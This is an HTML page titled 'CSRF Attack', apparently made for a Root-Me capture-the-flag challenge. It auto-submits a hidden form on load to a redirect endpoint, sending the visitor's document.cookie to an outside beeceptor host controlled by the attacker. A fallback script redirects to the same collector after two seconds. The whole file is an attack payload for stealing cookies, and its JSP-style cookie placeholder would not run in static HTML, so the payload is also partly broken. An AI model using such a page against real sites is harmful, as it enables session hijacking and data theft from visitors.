<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body onload="document.forms[0].submit()">
    <!-- Try to make a request that includes the flag as a parameter -->
    <form action="http://127.0.0.1:58039/redirect" method="GET">
        <input type="hidden" name="url" value="https://iamevil.free.beeceptor.com/flag?cookie=<%=document.cookie%>">
    </form>
    
    <!-- Fallback script -->
    <script>
        setTimeout(function() {
            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/form_timeout';
        }, 2000);
    </script>
</body>
</html>
